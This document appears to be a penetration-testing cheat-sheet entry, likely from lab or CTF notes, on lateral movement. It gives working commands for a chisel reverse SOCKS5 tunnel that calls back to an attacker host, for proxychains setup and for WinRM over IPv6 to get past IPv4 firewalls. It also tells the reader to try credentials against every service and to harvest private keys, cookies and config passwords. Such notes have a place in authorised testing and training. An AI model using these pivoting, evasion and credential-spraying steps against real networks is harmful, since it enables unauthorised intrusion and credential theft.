# 05.02 General Lateral Movement Considerations

> Pivot through non-standard ports, IPv6, and `chisel` SOCKS5 + proxychains when segmentation walls off direct routes.

## Overview

Network segmentation and non-standard ports frequently restrict tool connectivity. Use `netstat -ano` plus `tasklist /svc` to identify services on non-default ports locally. IPv6 is enabled by default on Windows and may bypass IPv4 firewall rules. Chisel provides a SOCKS5 pivot for proxychains when the attack host cannot reach internal segments directly.

## Steps

- Run `netstat -ano` to find listening ports; correlate PID to service with `tasklist /svc /FI "PID eq <PID>"`.
- IPv6: if IPv4 is blocked check IPv6 connectivity — use `[IPv6-addr]` syntax for WinRM and RDP.
- Set up chisel SOCKS5: server on Linux (`./chisel server --reverse`), client on Windows (`.\chisel.exe client <VPN-IP>:8080 R:socks`), add `socks5 127.0.0.1 1080` to `/etc/proxychains.conf`.
- Try all credentials against every service (RDP, WinRM, SSH, WMI, SMB) — non-admin accounts may still have WinRM or RDP rights.
- Reuse credentials; look for private keys, session cookies, config file passwords during post-exploitation.

## Commands

### netstat find listening ports

```powershell
netstat -ano
```

### tasklist correlate PID

```powershell
tasklist /svc /FI "PID eq 336"
```

### chisel server (Linux)

```bash
./chisel server --reverse
```

### chisel client (Windows)

```powershell
.\chisel.exe client 10.10.14.207:8080 R:socks
```

### Enter-PSSession over IPv6

```powershell
Enter-PSSession -ComputerName [dead:beef::647f:620f:3a1a:e978] -Authentication Negotiate
```
